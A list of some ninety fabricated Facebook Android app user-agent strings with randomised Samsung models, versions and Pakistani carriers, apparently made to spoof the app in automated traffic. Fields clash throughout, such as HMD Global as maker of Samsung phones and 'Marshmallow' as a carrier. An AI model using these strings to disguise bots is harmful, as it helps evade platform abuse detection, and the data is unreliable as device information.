"[FBAN/FB4A;FBAV/319.0.0.82.97;FBBV/12719717;FBDM/{density=3.1,width=1126,height=2421};FBLC/en_GB;FBRV/84764306;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730GM;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/195.0.0.69.125;FBBV/15946832;FBDM/{density=6.4,width=1198,height=2812};FBLC/en_US;FBRV/90620964;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G350E;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/130.0.0.28.50;FBBV/19764998;FBDM/{density=6.4,width=987,height=1325};FBLC/en_PK;FBRV/14074261;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5500;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/112.0.0.30.102;FBBV/52921421;FBDM/{density=5.4,width=766,height=2176};FBLC/en_US;FBRV/68760474;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M127F;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/345.0.0.1.65;FBBV/89591484;FBDM/{density=8.6,width=1292,height=1964};FBLC/en_US;FBRV/68023688;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J720M;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/42.0.0.10.85;FBBV/44275144;FBDM/{density=6.9,width=1026,height=1632};FBLC/en_PK;FBRV/69386935;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M336K;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/310.0.0.29.131;FBBV/93680314;FBDM/{density=4.6,width=804,height=1885};FBLC/en_US;FBRV/30435036;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/61.0.0.91.40;FBBV/23007326;FBDM/{density=7.6,width=1035,height=2803};FBLC/en_PK;FBRV/47507168;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3815;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/421.0.0.12.97;FBBV/87744576;FBDM/{density=2.9,width=1061,height=1535};FBLC/en_PK;FBRV/51480754;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5510;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/175.0.0.78.186;FBBV/48238459;FBDM/{density=7.1,width=757,height=2759};FBLC/en_US;FBRV/64364479;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J100FN;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/401.0.0.40.194;FBBV/77523020;FBDM/{density=5.2,width=581,height=1660};FBLC/en_PK;FBRV/97887504;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260F;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.66.16;FBBV/61674990;FBDM/{density=7.7,width=1069,height=2079};FBLC/en_PK;FBRV/84636965;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928C;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/200.0.0.71.161;FBBV/82088849;FBDM/{density=5.6,width=580,height=2551};FBLC/en_US;FBRV/27739091;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727T;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/206.0.0.67.103;FBBV/88027096;FBDM/{density=1.4,width=588,height=2079};FBLC/en_PK;FBRV/24062276;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J3119S;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/199.0.0.34.138;FBBV/89698232;FBDM/{density=4.9,width=1252,height=1113};FBLC/en_GB;FBRV/64186690;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200F;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/153.0.0.27.23;FBBV/62695344;FBDM/{density=1.1,width=1312,height=2614};FBLC/en_PK;FBRV/37645145;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G970F;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/149.0.0.91.130;FBBV/28484145;FBDM/{density=1.6,width=563,height=2934};FBLC/en_US;FBRV/80503638;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337AZ;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/156.0.0.11.100;FBBV/35567381;FBDM/{density=8.2,width=867,height=2537};FBLC/en_PK;FBRV/48702519;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N910C;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/268.0.0.63.111;FBBV/83284826;FBDM/{density=8.7,width=1257,height=2373};FBLC/en_PK;FBRV/99177766;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G350;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/414.0.0.34.152;FBBV/50273965;FBDM/{density=5.1,width=630,height=2676};FBLC/en_PK;FBRV/18909407;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700YD;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/185.0.0.17.182;FBBV/14149261;FBDM/{density=1.6,width=626,height=2704};FBLC/en_PK;FBRV/90229255;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A3050;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/317.0.0.30.7;FBBV/32062465;FBDM/{density=8.1,width=1040,height=1436};FBLC/en_GB;FBRV/15519385;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A037G;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/265.0.0.32.195;FBBV/91641969;FBDM/{density=2.6,width=591,height=2710};FBLC/en_GB;FBRV/61053901;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M305M;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/313.0.0.99.108;FBBV/75369661;FBDM/{density=4.5,width=1177,height=2052};FBLC/en_PK;FBRV/46118956;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A260G;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/43.0.0.4.156;FBBV/11902028;FBDM/{density=7.6,width=1428,height=2287};FBLC/en_US;FBRV/42479659;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A225M;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/376.0.0.25.92;FBBV/31917180;FBDM/{density=4.1,width=1278,height=1298};FBLC/en_PK;FBRV/18990906;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G973F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/350.0.0.37.101;FBBV/39895036;FBDM/{density=8.9,width=1337,height=1302};FBLC/en_PK;FBRV/22500650;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5510;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/428.0.0.64.86;FBBV/71166792;FBDM/{density=5.2,width=796,height=1449};FBLC/en_US;FBRV/83679678;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920S;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/88.0.0.15.130;FBBV/27189840;FBDM/{density=7.4,width=544,height=2837};FBLC/en_GB;FBRV/69321029;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737P;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/434.0.0.23.76;FBBV/24702847;FBDM/{density=1.8,width=661,height=1813};FBLC/en_US;FBRV/79525743;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A137F;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/371.0.0.36.193;FBBV/81734736;FBDM/{density=8.2,width=1007,height=1925};FBLC/en_GB;FBRV/14340766;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7106;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.16.152;FBBV/81791328;FBDM/{density=8.8,width=1232,height=1527};FBLC/en_GB;FBRV/42250216;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928I;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/147.0.0.23.44;FBBV/44036442;FBDM/{density=3.8,width=872,height=2086};FBLC/en_PK;FBRV/66021655;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A202K;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/318.0.0.73.121;FBBV/64977232;FBDM/{density=4.2,width=1268,height=1494};FBLC/en_GB;FBRV/23832987;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M236B;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/373.0.0.14.120;FBBV/19979703;FBDM/{density=3.5,width=990,height=1290};FBLC/en_PK;FBRV/49839034;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A215U1;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/325.0.0.68.49;FBBV/12561015;FBDM/{density=1.8,width=1211,height=1608};FBLC/en_PK;FBRV/24920042;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A526B;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/15.0.0.98.138;FBBV/85893514;FBDM/{density=5.8,width=941,height=2820};FBLC/en_GB;FBRV/90922055;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G800F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/226.0.0.3.191;FBBV/84369779;FBDM/{density=4.3,width=1295,height=1355};FBLC/en_PK;FBRV/66268690;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532MT;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/11.0.0.77.20;FBBV/16261007;FBDM/{density=6.3,width=758,height=1279};FBLC/en_PK;FBRV/49221150;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A5009;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/219.0.0.83.135;FBBV/78763968;FBDM/{density=7.9,width=776,height=1795};FBLC/en_US;FBRV/67594579;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G950W;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/276.0.0.8.138;FBBV/30050190;FBDM/{density=6.8,width=1240,height=2926};FBLC/en_PK;FBRV/84375498;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605K;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/229.0.0.10.49;FBBV/81998185;FBDM/{density=4.7,width=1011,height=2994};FBLC/en_PK;FBRV/79330453;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung 9005;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/286.0.0.51.164;FBBV/11735109;FBDM/{density=7.1,width=639,height=1129};FBLC/en_GB;FBRV/26704439;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025G;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/271.0.0.36.144;FBBV/56970379;FBDM/{density=8.3,width=932,height=1544};FBLC/en_GB;FBRV/62020586;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2019;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/112.0.0.50.44;FBBV/45743263;FBDM/{density=6.1,width=791,height=2434};FBLC/en_PK;FBRV/59662835;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J100H;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/366.0.0.84.5;FBBV/38314739;FBDM/{density=2.5,width=972,height=1382};FBLC/en_US;FBRV/11954675;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A536V;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/331.0.0.34.127;FBBV/76750707;FBDM/{density=7.2,width=1200,height=1598};FBLC/en_US;FBRV/33177625;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025G;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/38.0.0.9.68;FBBV/26266992;FBDM/{density=6.5,width=1469,height=2866};FBLC/en_GB;FBRV/50420391;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930W8;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/16.0.0.73.44;FBBV/75398592;FBDM/{density=8.6,width=591,height=2512};FBLC/en_US;FBRV/14055144;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200F;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/190.0.0.39.156;FBBV/85120249;FBDM/{density=9.7,width=859,height=2677};FBLC/en_GB;FBRV/97836329;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C7018;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/103.0.0.36.110;FBBV/46339041;FBDM/{density=5.5,width=553,height=1517};FBLC/en_PK;FBRV/21108686;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E025F;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/75.0.0.69.45;FBBV/36537095;FBDM/{density=5.1,width=631,height=1876};FBLC/en_GB;FBRV/15039045;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/181.0.0.49.180;FBBV/57946297;FBDM/{density=2.7,width=1054,height=2685};FBLC/en_PK;FBRV/76284629;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung T116;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/141.0.0.28.82;FBBV/85617249;FBDM/{density=7.7,width=1444,height=2006};FBLC/en_GB;FBRV/31338131;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G996W;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/185.0.0.49.33;FBBV/18430816;FBDM/{density=6.4,width=859,height=1899};FBLC/en_PK;FBRV/14738702;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G316ML;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/257.0.0.96.140;FBBV/95174941;FBDM/{density=8.7,width=1004,height=2238};FBLC/en_US;FBRV/68781453;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M107F;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/242.0.0.83.78;FBBV/50136648;FBDM/{density=7.4,width=538,height=1925};FBLC/en_GB;FBRV/38489643;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M315F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/37.0.0.23.39;FBBV/94613096;FBDM/{density=9.3,width=746,height=1776};FBLC/en_PK;FBRV/91097314;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M017F;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/374.0.0.71.65;FBBV/23606650;FBDM/{density=9.9,width=1047,height=2498};FBLC/en_US;FBRV/24426040;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A305G;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/279.0.0.81.17;FBBV/75188466;FBDM/{density=3.2,width=775,height=2088};FBLC/en_GB;FBRV/87969282;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A9080;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/81.0.0.28.181;FBBV/61295690;FBDM/{density=4.5,width=966,height=1560};FBLC/en_GB;FBRV/62389374;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/288.0.0.3.134;FBBV/21190865;FBDM/{density=1.1,width=671,height=1869};FBLC/en_GB;FBRV/51695642;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3812;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/349.0.0.21.198;FBBV/52910958;FBDM/{density=8.6,width=886,height=2378};FBLC/en_US;FBRV/89120611;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930T;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/428.0.0.82.79;FBBV/14366215;FBDM/{density=7.3,width=1283,height=2435};FBLC/en_PK;FBRV/83985131;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/146.0.0.26.173;FBBV/80279433;FBDM/{density=7.2,width=1295,height=1954};FBLC/en_GB;FBRV/36042062;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A910F;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/191.0.0.4.46;FBBV/44104047;FBDM/{density=2.7,width=935,height=2318};FBLC/en_GB;FBRV/80484508;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986U;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/339.0.0.97.104;FBBV/47999249;FBDM/{density=9.5,width=1034,height=2709};FBLC/en_US;FBRV/70628021;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A125F;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/318.0.0.65.141;FBBV/26697425;FBDM/{density=8.8,width=585,height=1934};FBLC/en_US;FBRV/87383039;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A526W;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/233.0.0.36.111;FBBV/41203321;FBDM/{density=7.1,width=618,height=1248};FBLC/en_GB;FBRV/71583900;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G611F;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/193.0.0.83.190;FBBV/50350328;FBDM/{density=3.2,width=762,height=2989};FBLC/en_US;FBRV/17183944;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915T;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/395.0.0.42.58;FBBV/84341073;FBDM/{density=2.2,width=859,height=2497};FBLC/en_GB;FBRV/41961484;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920G;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/79.0.0.39.63;FBBV/76513970;FBDM/{density=1.9,width=1414,height=1449};FBLC/en_US;FBRV/34612042;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915W8;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/204.0.0.11.138;FBBV/86041735;FBDM/{density=7.6,width=648,height=2764};FBLC/en_US;FBRV/68436821;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/251.0.0.42.83;FBBV/90131077;FBDM/{density=4.9,width=1431,height=1724};FBLC/en_US;FBRV/61983177;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N935K;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/57.0.0.30.81;FBBV/38986862;FBDM/{density=9.1,width=691,height=2686};FBLC/en_GB;FBRV/67522908;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260AZ;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/173.0.0.46.54;FBBV/55523153;FBDM/{density=2.3,width=897,height=2167};FBLC/en_US;FBRV/91846641;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J510FN;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/408.0.0.49.7;FBBV/59186352;FBDM/{density=3.8,width=504,height=1505};FBLC/en_PK;FBRV/95902362;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G388F;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/422.0.0.15.183;FBBV/97586475;FBDM/{density=1.2,width=1038,height=1739};FBLC/en_US;FBRV/87202023;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G890A;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.24.102;FBBV/61198829;FBDM/{density=9.3,width=626,height=1825};FBLC/en_US;FBRV/39666122;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700FD;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/259.0.0.41.141;FBBV/12630549;FBDM/{density=8.4,width=1466,height=1841};FBLC/en_US;FBRV/95440826;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/86.0.0.85.41;FBBV/78268370;FBDM/{density=3.2,width=1162,height=2838};FBLC/en_US;FBRV/93465005;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N750L;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.4.194;FBBV/57430900;FBDM/{density=9.5,width=1048,height=2591};FBLC/en_GB;FBRV/86613100;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J100FN;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/212.0.0.38.116;FBBV/72389073;FBDM/{density=1.9,width=839,height=2622};FBLC/en_GB;FBRV/81738883;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M105F;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/260.0.0.60.124;FBBV/12711551;FBDM/{density=2.2,width=1128,height=1494};FBLC/en_US;FBRV/95377314;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N981B;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/300.0.0.96.167;FBBV/68896466;FBDM/{density=2.2,width=1019,height=1793};FBLC/en_GB;FBRV/95849192;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G925A;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/394.0.0.98.187;FBBV/98912998;FBDM/{density=7.6,width=1393,height=1129};FBLC/en_PK;FBRV/75481776;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965U;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/375.0.0.97.200;FBBV/27343998;FBDM/{density=4.4,width=1081,height=2881};FBLC/en_GB;FBRV/34292799;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022G;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/276.0.0.70.1;FBBV/16454809;FBDM/{density=1.9,width=1013,height=2230};FBLC/en_PK;FBRV/60921621;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G996B;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/288.0.0.14.76;FBBV/37012522;FBDM/{density=5.6,width=825,height=2608};FBLC/en_US;FBRV/75237555;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A505GN;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/352.0.0.82.171;FBBV/75606666;FBDM/{density=2.5,width=757,height=1576};FBLC/en_US;FBRV/91210630;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313HY;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
